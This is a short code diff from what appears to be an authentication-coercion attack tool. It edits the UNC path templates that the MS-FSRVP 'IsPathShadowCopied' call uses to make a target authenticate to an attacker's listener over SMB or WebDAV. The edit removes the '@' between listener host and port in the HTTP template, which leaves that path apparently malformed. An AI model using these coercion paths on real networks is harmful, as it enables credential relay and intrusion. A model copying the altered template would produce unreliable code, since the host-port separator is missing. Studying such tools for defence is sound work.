@@ -37,7 +37,7 @@ class IsPathShadowCopied(MSPROTOCOLRPCCALL):
 
     exploit_paths = [
         ("smb", "\\\\{{listener}}\x00"),
-        ("http", "\\\\{{listener}}@{{http_listen_port}}/{{rnd(3)}}\x00"),
+        ("http", "\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\x00"),
     ]
 
     access = {
